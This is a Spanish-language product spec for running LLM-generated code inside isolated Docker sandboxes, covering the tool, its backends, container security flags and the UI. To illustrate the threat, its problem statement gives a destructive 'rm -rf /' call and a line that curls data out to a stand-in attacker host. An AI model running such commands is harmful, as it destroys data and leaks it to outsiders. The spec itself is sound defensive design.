# FEAT-010 — Sandbox Code Execution

**Estado**: Draft
**Fecha**: 2026-05-11
**Epic**: EPIC-073

---

## Problem Statement

**Tipo**: Feature nueva (4 capacidades de ejecucion segura de codigo)
**Actor**: Usuario local — persona que instala y opera Data Mirai Engine en su computadora.

Data Mirai Engine ejecuta grafos agentivos que procesan datos y generan outputs. Pero hay un caso de uso critico que no puede resolver: ejecutar codigo generado por el LLM de forma segura. Tres escenarios concretos:

1. **Data transformation**: El LLM genera un script Python para limpiar/transformar un CSV de 10K filas. Hoy no hay forma de ejecutar ese script dentro del grafo. El usuario tendria que copiar el codigo, pegarlo en un terminal, ejecutarlo, y copiar el resultado de vuelta al agente. Rompe el flujo completamente.

2. **Code generation agents**: Agentes que generan codigo (tests, migraciones, scripts de automatizacion) no pueden validar que el codigo compile/funcione. Generan texto que parece codigo pero nadie lo verifica. Un agente de coding competitivo (como Devin, Codex) necesita ejecutar y iterar.

3. **Seguridad critica**: Si se ejecutara codigo directamente en el proceso del server, un LLM que genera `os.system("rm -rf /")` o `import subprocess; subprocess.call(["curl", "evil.com/exfil", "-d", data])` seria catastrofico. No hay aislamiento.

Frameworks como E2B, Modal y OpenInterpreter resuelven esto con sandboxes. Data Mirai necesita su propia capa de ejecucion aislada que funcione local (Docker) sin depender de servicios cloud.

---

## Objetivo

Cuando esto este implementado, el usuario puede:
1. Agregar nodos `code/execute` a grafos que ejecutan codigo Python, JavaScript o Bash generado por nodos LLM previos
2. Ejecutar ese codigo en un sandbox aislado (Docker container efimero) con limites de tiempo, memoria y sin acceso a red por default
3. Recibir stdout, stderr y archivos creados como output del nodo para usar en nodos posteriores
4. Configurar el nivel de aislamiento (network, filesystem, timeout) por nodo
5. Usar un backend directo (sin Docker) para desarrollo local rapido con warning de seguridad

---

## Features

### 10.1 — Code Execution Tool: Nuevo Tool `code/execute`

**Problema**: No existe un tool en el catalogo de Data Mirai para ejecutar codigo. Los 16 tools builtin cubren AI, data, logic y triggers, pero no ejecucion de codigo arbitrario. Un grafo que genera un script Python en un nodo LLM no puede ejecutarlo en el siguiente nodo.

**Solucion**: Nuevo tool `code/execute` que recibe codigo como input, lo ejecuta en un sandbox backend, y retorna stdout/stderr/exit_code/files como output. El codigo puede venir de data_map (output de un nodo LLM previo) o ser estatico en la config del nodo.

**Arquitectura**:
- Tool `code/execute`:
  - Category: `code`
  - Type: `execute`
  - Inputs:
    - `code` (string, required): codigo fuente a ejecutar
    - `language` (string, required): `python` | `javascript` | `bash`
    - `timeout_seconds` (int, optional, default: 30): max tiempo de ejecucion
    - `memory_mb` (int, optional, default: 256): limite de memoria
    - `network_enabled` (bool, optional, default: false): acceso a red
    - `files_in` (dict, optional): archivos a montar en el sandbox `{ "data.csv": "contenido..." }`
    - `env_vars` (dict, optional): variables de entorno para el sandbox
    - `sandbox_backend` (string, optional, default: "auto"): `docker` | `direct` | `auto`
  - Outputs:
    - `stdout` (string): salida estandar
    - `stderr` (string): salida de error
    - `exit_code` (int): codigo de salida (0 = exito)
    - `files_out` (dict): archivos creados en `/output/` del sandbox `{ "result.json": "contenido..." }`
    - `duration_ms` (int): tiempo de ejecucion
    - `truncated` (bool): true si stdout/stderr excedieron el limite (1MB)
- El tool delega al `SandboxManager` que selecciona el backend correcto
- Stdout/stderr se truncan a 1MB cada uno para evitar memory blow en el grafo

**Entidades nuevas**:

Tabla `code_execution` en SQLite (log de ejecuciones para auditoria):

| Columna | Tipo | Constraint |
|---|---|---|
| id | TEXT | PK |
| session_id | TEXT | FK sessions(id), NOT NULL |
| node_id | TEXT | NOT NULL |
| language | TEXT | NOT NULL |
| code_hash | TEXT | NOT NULL (SHA-256 del codigo, no el codigo en si para no almacenar potencialmente peligroso) |
| code_size_bytes | INTEGER | NOT NULL |
| sandbox_backend | TEXT | NOT NULL (docker / direct) |
| exit_code | INTEGER | NULL |
| duration_ms | INTEGER | NULL |
| memory_peak_mb | INTEGER | NULL |
| network_enabled | BOOLEAN | NOT NULL |
| status | TEXT | NOT NULL DEFAULT 'pending' (pending / running / completed / failed / timeout) |
| error_message | TEXT | NULL |
| created_at | TEXT | NOT NULL |

**Contratos API**:
- `POST /api/sandbox/execute` — ejecutar codigo (endpoint directo para testing/playground). Body: `{ code, language, timeout_seconds?, memory_mb?, network_enabled?, files_in?, env_vars? }`. Response: `{ result: CodeExecutionResult }`
- `GET /api/sandbox/status` — estado del sandbox system (Docker available, backends). Response: `{ docker_available: bool, docker_version?: str, default_backend: str, executions_today: int }`
- `GET /api/sandbox/executions` — log de ejecuciones recientes. Query params: `page`, `limit`, `session_id?`. Response: `{ executions: CodeExecution[], total: int }`

No necesita CRUD — el tool se usa dentro de grafos via nodo. El endpoint POST es para playground/testing directo.

**Pantallas**:
- **ToolCatalog**: nueva categoria "Code" con tool `code/execute`. Icono de terminal/codigo.
- **NodeConfigPanel → nodo code/execute**: editor de codigo con syntax highlighting (lenguaje seleccionable), campos de timeout/memory/network, seccion files_in para montar archivos. Toggle "sandbox backend" (Docker/Direct/Auto).
- **Session Detail → nodo code/execute expandido**: muestra stdout/stderr con syntax highlighting, exit_code badge (verde 0, rojo != 0), duracion, archivos generados con preview/download.

**Reglas**:

| ID | Invariante | Enforcement |
|---|---|---|
| REGLA-146 | code/execute SIEMPRE registra ejecucion en code_execution antes de ejecutar (status pending). Al terminar actualiza status. Esto asegura auditoria incluso si el proceso crashea | Tool pre/post hooks |
| REGLA-147 | Timeout es hard limit. Si el proceso no termina en timeout_seconds, se mata (SIGKILL) y el nodo retorna exit_code -1 con error "execution timeout". No hay grace period | SandboxBackend enforce timeout |
| REGLA-148 | Stdout/stderr se truncan a 1MB cada uno. Si se excede, se retorna los primeros 1MB con `truncated: true`. No se almacena el exceso en memoria | Stream con buffer limitado |
| REGLA-149 | El codigo fuente se loguea hasheado (SHA-256), NUNCA en plaintext en la tabla code_execution. El codigo completo existe solo en el execution_span del session (que ya tiene el graph state) | Code hashing en log |

**Archivos a crear/modificar**:
- CREAR `framework/src/datamirai_engine/tools/builtin/code/__init__.py` — exports
- CREAR `framework/src/datamirai_engine/tools/builtin/code/execute.py` — tool code/execute
- CREAR `framework/src/datamirai_engine/sandbox/__init__.py` — exports
- CREAR `framework/src/datamirai_engine/sandbox/manager.py` — SandboxManager + CodeExecutionResult dataclass
- MODIFICAR `framework/src/datamirai_engine/tools/builtin/__init__.py` — registrar categoria code
- MODIFICAR `app/server/datamirai_app/database.py` — tabla code_execution + migracion
- CREAR `app/server/datamirai_app/routes/sandbox.py` — endpoints execute + status + executions
- MODIFICAR `app/server/datamirai_app/app.py` — registrar blueprint sandbox
- MODIFICAR `app/web/src/lib/api.ts` — funciones client para endpoints sandbox
- MODIFICAR `app/web/src/components/editor/ToolCatalog.tsx` — categoria Code con tool code/execute
- MODIFICAR `app/web/src/components/editor/NodeConfigPanel.tsx` — config panel para code/execute con editor de codigo

---

### 10.2 — Sandbox Backends: Docker + Direct

**Problema**: Se necesita al menos un mecanismo para ejecutar codigo aislado. Docker es el estandar de la industria para sandboxing pero no todos los usuarios lo tienen instalado. Para desarrollo rapido, ejecutar directamente es util pero inseguro para produccion.

**Solucion**: Dos backends intercambiables con interfaz comun. `LocalDockerBackend` (default, seguro) y `DirectBackend` (solo dev, con warnings). Un `auto` mode que usa Docker si disponible, Direct si no.

**Arquitectura**:
- `SandboxBackend` (ABC):
  - `execute(code, language, config) -> CodeExecutionResult`
  - `is_available() -> bool` — check si el backend funciona
  - `get_info() -> BackendInfo` — version, capabilities
- `LocalDockerBackend`:
  - Crea container Docker efimero por ejecucion
  - Imagenes base pre-configuradas:
    - `datamirai-sandbox-python:latest` — Python 3.12 slim + libs comunes (pandas, numpy, requests, beautifulsoup4)
    - `datamirai-sandbox-node:latest` — Node.js 20 alpine + libs comunes (axios, cheerio, lodash)
    - `datamirai-sandbox-bash:latest` — Alpine con coreutils + jq + curl
  - Proceso: `docker run --rm` con flags de seguridad (ver 10.3)
  - Codigo se monta como archivo temporal, stdout/stderr se capturan via docker attach
  - Archivos de `/output/` se copian de vuelta al host post-ejecucion
  - Container se destruye automaticamente al terminar (--rm flag)
- `DirectBackend`:
  - Ejecuta codigo directamente en un subprocess del server
  - `subprocess.run()` con timeout, sin aislamiento de filesystem/network
  - Warning prominente en logs y UI: "DirectBackend NO es seguro. Solo usar en desarrollo local."
  - Disabled por default. El usuario debe habilitarlo explicitamente via config
- `SandboxManager`:
  - `auto` mode: intenta Docker primero (`docker info`), si falla usa Direct con warning
  - Cache de disponibilidad (no checkear Docker en cada ejecucion, solo al arrancar + cada 5 min)
  - Config global: default backend, max concurrent executions (default: 3)

**Entidades nuevas**: Ninguna adicional. Usa tabla `code_execution` de 10.1.

**Contratos API**: Reutiliza endpoints de 10.1. El `GET /api/sandbox/status` retorna info del backend activo.

**Pantallas**:
- **Settings → seccion "Sandbox"** (`/settings/sandbox`):
  - Estado de Docker (disponible/no disponible, version)
  - Backend activo (Docker/Direct/Auto) con selector
  - Warning visual si Direct esta activo: banner amarillo "Ejecucion sin aislamiento — solo desarrollo"
  - Max concurrent executions (slider 1-10)
  - Boton "Build images" que dispara build de las imagenes Docker sandbox (primer uso)
  - Estado de imagenes (built/not built para cada lenguaje)

**Reglas**:

| ID | Invariante | Enforcement |
|---|---|---|
| REGLA-150 | DirectBackend esta DESHABILITADO por default. El usuario debe habilitarlo explicitamente desde Settings o via environment variable `DATAMIRAI_SANDBOX_ALLOW_DIRECT=true` | SandboxManager config |
| REGLA-151 | Cada vez que DirectBackend ejecuta codigo, se emite un WARNING en logs con: codigo hash, language, user. Esto asegura trazabilidad de ejecuciones sin aislamiento | DirectBackend.execute() logger |
| REGLA-152 | Max 3 ejecuciones concurrentes de sandbox por default. Si se excede, las nuevas se encolan (FIFO). Si la cola excede 10, se rechazan con error | SandboxManager semaphore |
| REGLA-153 | Imagenes Docker sandbox se buildan on-demand (primer uso) o via boton en Settings. No se buildan al arrancar el server automaticamente | SandboxManager lazy build |

**Archivos a crear/modificar**:
- CREAR `framework/src/datamirai_engine/sandbox/backend.py` — SandboxBackend ABC + BackendInfo + CodeExecutionConfig
- CREAR `framework/src/datamirai_engine/sandbox/docker_backend.py` — LocalDockerBackend
- CREAR `framework/src/datamirai_engine/sandbox/direct_backend.py` — DirectBackend
- CREAR `framework/src/datamirai_engine/sandbox/docker/` — Dockerfiles para python, node, bash
- CREAR `framework/src/datamirai_engine/sandbox/docker/Dockerfile.python` — Python sandbox image
- CREAR `framework/src/datamirai_engine/sandbox/docker/Dockerfile.node` — Node.js sandbox image
- CREAR `framework/src/datamirai_engine/sandbox/docker/Dockerfile.bash` — Bash sandbox image
- MODIFICAR `app/web/src/app/settings/sandbox/page.tsx` — pagina de settings de sandbox (o crearla)
- CREAR `app/web/src/app/settings/sandbox/page.tsx` — pagina settings sandbox

---

### 10.3 — Security: Aislamiento del Container

**Problema**: Un container Docker por default tiene demasiados permisos. Puede escalar privilegios, usar toda la memoria del host, crear miles de procesos, o acceder a la red. Para ejecutar codigo generado por un LLM, el aislamiento debe ser estricto.

**Solucion**: Configurar cada container Docker con restricciones de seguridad estrictas: capabilities dropped, no privilege escalation, PID limits, memory limits, filesystem read-only excepto /tmp y /output, network disabled por default.

**Arquitectura**:
- Docker run flags de seguridad (aplicados por `LocalDockerBackend`):
  - `--cap-drop=ALL` — eliminar todas las Linux capabilities
  - `--security-opt=no-new-privileges` — prevenir escalation
  - `--pids-limit=64` — max 64 procesos dentro del container
  - `--memory={memory_mb}m` — limite de memoria (config del nodo, default 256MB)
  - `--memory-swap={memory_mb}m` — sin swap (igual que memory para evitar OOM via swap)
  - `--cpus=1` — max 1 CPU
  - `--read-only` — filesystem read-only
  - `--tmpfs /tmp:rw,size=64m` — /tmp writable, max 64MB
  - `-v /output:rw` — directorio de output writable
  - `--network=none` — sin red (si network_enabled=false)
  - `--network=bridge` — red limitada (si network_enabled=true)
  - `--user=1000:1000` — ejecutar como non-root user
  - `--rm` — auto-destroy al terminar
- Cada ejecucion es un container nuevo. No se reutilizan containers.
- El codigo se monta via `-v` como archivo temporal read-only
- Files_in se montan via `-v` como archivos read-only adicionales
- Despues de ejecucion, files_out se copian de `/output/` via `docker cp`

**Entidades nuevas**: Ninguna. Es configuracion de runtime.

**Contratos API**: Ninguno adicional. La seguridad es transparente para el usuario — se aplica automaticamente.

**Pantallas**:
- **NodeConfigPanel → code/execute → seccion "Sandbox"**:
  - Timeout (slider o input, 5-300 seconds)
  - Memory limit (slider o input, 64-1024 MB)
  - Network access (toggle on/off, default off)
  - Info text: "El codigo se ejecuta en un container aislado con permisos restringidos"

**Reglas**:

| ID | Invariante | Enforcement |
|---|---|---|
| REGLA-154 | Containers SIEMPRE se ejecutan como non-root (user 1000). Nunca root dentro del container | Docker run --user flag |
| REGLA-155 | Containers SIEMPRE se destruyen al terminar (--rm). No quedan containers zombies. Si el server crashea, cleanup en startup via `docker ps --filter` | Docker --rm + startup cleanup |
| REGLA-156 | Filesystem SIEMPRE read-only excepto /tmp (64MB) y /output. El codigo no puede escribir en /usr, /etc, /home | Docker --read-only + --tmpfs |
| REGLA-157 | Network disabled por default. Solo se habilita si el usuario explicitamente configura network_enabled=true en el nodo. Warning en UI cuando network esta enabled | Config check + UI warning |
| REGLA-158 | Memory limit es hard. Si el proceso excede, Docker mata el container (OOM kill). El nodo retorna exit_code -1 con error "memory limit exceeded" | Docker --memory flag |

**Archivos a crear/modificar**:
- MODIFICAR `framework/src/datamirai_engine/sandbox/docker_backend.py` — implementar todos los flags de seguridad en el docker run command
- MODIFICAR `app/web/src/components/editor/NodeConfigPanel.tsx` — seccion sandbox con sliders de timeout/memory/network

---

### 10.4 — UI: code/execute en Catalogo + Config de Sandbox

**Problema**: El tool code/execute necesita estar visible en el catalogo del editor y tener un config panel adecuado con editor de codigo, opciones de sandbox y preview de resultados.

**Solucion**: Agregar la categoria "Code" al catalogo, el tool code/execute con icono de terminal, y un config panel con editor de codigo minimo (syntax highlighting basico, selector de lenguaje).

**Arquitectura**: Componentes React:
- `CodeEditor` component (lightweight):
  - Textarea con syntax highlighting basico via CSS (keyword coloring para Python/JS/Bash)
  - Numeros de linea
  - Tab key inserta 4 espacios
  - Props: `code`, `language`, `onChange`
  - NO es Monaco/CodeMirror completo (demasiado heavy). Es textarea estilizada.
  - Futuro: reemplazar con CodeMirror si la demanda lo justifica
- Integracion con ToolCatalog: nueva categoria "Code" con icono `</>`, color morado
- NodeConfigPanel para code/execute:
  - CodeEditor (principal)
  - Language selector (Python/JavaScript/Bash)
  - Seccion Sandbox (timeout, memory, network)
  - Seccion Files (input files, output dir)
  - Seccion Variables (env vars)

**Entidades nuevas**: Ninguna.

**Contratos API**: Ninguno adicional.

**Pantallas**:
- **ToolCatalog**: categoria "Code" con tool `code/execute`
- **NodeConfigPanel → code/execute**: CodeEditor + config completa como se describio
- **Session Detail → nodo code/execute**: stdout/stderr con coloring, exit_code badge, files con preview

**Reglas**:

| ID | Invariante | Enforcement |
|---|---|---|
| REGLA-159 | El CodeEditor NO ejecuta codigo. Es solo un editor de texto. La ejecucion ocurre durante la sesion del agente, no al editar el grafo | Component design (textarea, no eval) |
| REGLA-160 | El selector de lenguaje determina la imagen Docker usada. Si el usuario escribe Python pero selecciona "bash", se ejecuta como bash. El lenguaje seleccionado es el source of truth, no deteccion automatica | Tool config.language |

**Archivos a crear/modificar**:
- CREAR `app/web/src/components/editor/CodeEditor.tsx` — editor de codigo lightweight con syntax highlighting basico
- MODIFICAR `app/web/src/components/editor/ToolCatalog.tsx` — categoria Code + tool code/execute
- MODIFICAR `app/web/src/components/editor/NodeConfigPanel.tsx` — panel completo para code/execute
- MODIFICAR `app/web/src/components/ui/ToolIcon.tsx` — icono para categoria code

---

## Dependencias entre features

```
10.1 (code/execute tool) <- independiente, se implementa primero (define el tool + manager interface)
10.2 (Sandbox backends) <- depende de 10.1 (implementa los backends que el manager usa)
10.3 (Security) <- depende de 10.2 (aplica flags de seguridad al docker backend)
10.4 (UI) <- depende de 10.1 (necesita el tool en el catalogo para el config panel)
```

Orden: 10.1 → 10.2 → 10.3 → 10.4

Dependencias externas:
- Docker Engine — necesario para LocalDockerBackend. Si no esta instalado, solo DirectBackend disponible
- FEAT-009 (Guardrails) — DangerousCommandDetector puede evaluar codigo antes de code/execute

---

## Entidades nuevas (resumen consolidado)

### code_execution
| Columna | Tipo | Constraint |
|---|---|---|
| id | TEXT | PK |
| session_id | TEXT | FK sessions(id), NOT NULL |
| node_id | TEXT | NOT NULL |
| language | TEXT | NOT NULL |
| code_hash | TEXT | NOT NULL |
| code_size_bytes | INTEGER | NOT NULL |
| sandbox_backend | TEXT | NOT NULL |
| exit_code | INTEGER | NULL |
| duration_ms | INTEGER | NULL |
| memory_peak_mb | INTEGER | NULL |
| network_enabled | BOOLEAN | NOT NULL |
| status | TEXT | NOT NULL DEFAULT 'pending' |
| error_message | TEXT | NULL |
| created_at | TEXT | NOT NULL |

---

## Maquinas de estado

### Code Execution

```
PENDING -> RUNNING (container started)
RUNNING -> COMPLETED (exit_code 0)
RUNNING -> FAILED (exit_code != 0)
RUNNING -> TIMEOUT (exceeded timeout_seconds)
PENDING -> FAILED (container failed to start)
```

---

## Reglas de negocio nuevas (consolidado)

| ID | Invariante | Enforcement |
|---|---|---|
| REGLA-146 | Toda ejecucion se registra en code_execution ANTES de ejecutar | Tool pre-hook |
| REGLA-147 | Timeout = hard kill (SIGKILL). Exit_code -1 + error "timeout" | Backend enforce |
| REGLA-148 | Stdout/stderr truncados a 1MB con flag truncated | Stream buffer limit |
| REGLA-149 | Codigo logueado hasheado (SHA-256), nunca plaintext en tabla | Code hash |
| REGLA-150 | DirectBackend deshabilitado por default. Requiere config explicita | SandboxManager |
| REGLA-151 | DirectBackend emite WARNING en cada ejecucion | Logger |
| REGLA-152 | Max 3 concurrentes default. Cola FIFO max 10 | Semaphore |
| REGLA-153 | Docker images build on-demand o via Settings | Lazy build |
| REGLA-154 | Containers SIEMPRE non-root (user 1000) | Docker --user |
| REGLA-155 | Containers SIEMPRE --rm. Cleanup al startup si hay zombies | Docker flag + startup |
| REGLA-156 | Filesystem read-only excepto /tmp y /output | Docker --read-only |
| REGLA-157 | Network disabled por default. Warning cuando enabled | Config + UI |
| REGLA-158 | Memory hard limit. OOM = exit_code -1 + error | Docker --memory |
| REGLA-159 | CodeEditor no ejecuta codigo. Solo textarea | Component design |
| REGLA-160 | Lenguaje seleccionado = source of truth, no autodeteccion | Tool config |

---

## Notas de implementacion

- **Docker SDK vs CLI**: usar `docker` CLI directamente via `asyncio.create_subprocess_exec` en vez del SDK Python (`docker-py`). Razones: menos dependencia, mas transparente (el usuario puede ver los `docker run` commands en logs), y evita issues de compatibilidad del SDK con versiones de Docker.
- **Imagenes base**: las Dockerfiles deben ser minimas. Python: `FROM python:3.12-slim` + `pip install pandas numpy requests beautifulsoup4`. Node: `FROM node:20-alpine` + `npm install -g axios cheerio lodash`. Bash: `FROM alpine:3.19` + `apk add coreutils jq curl`. Build time < 1 min cada una.
- **File I/O**: files_in se escriben a un directorio temporal del host y se montan read-only en el container. files_out se escriben por el codigo al directorio /output/ dentro del container, y se copian de vuelta via `docker cp` post-ejecucion. Si files_out excede 10MB total, se trunca con warning.
- **Cleanup robusto**: si el server crashea con containers activos, al reiniciar hace `docker ps --filter "label=datamirai-sandbox" -q | xargs docker kill` para limpiar zombies. Label `datamirai-sandbox` se agrega a todos los containers creados.
- **DirectBackend isolation**: aunque no tiene Docker, usa `subprocess.run` con `timeout`, `cwd` en directorio temporal, y `env` limpio (no hereda env del server). Es "algo aislado" pero no seguro — de ahi el warning prominente.
- **Dependencia Docker opcional**: `docker` CLI es dependencia de runtime, no de Python. El framework no importa docker-py. Solo ejecuta `docker` como subprocess. Si Docker no esta instalado, `is_available()` retorna False y se usa DirectBackend (o error si Direct esta deshabilitado).

---

## doc_refs
- `docs/prd/draft/DATAMIRAI-ENGINE-PRD.md` — PRD base del engine
- `docs/ARCHITECTURE.md` — stack, convenciones
- `docs/prd/draft/FEAT-009.md` — guardrails (DangerousCommandDetector evalua inputs de code/execute)
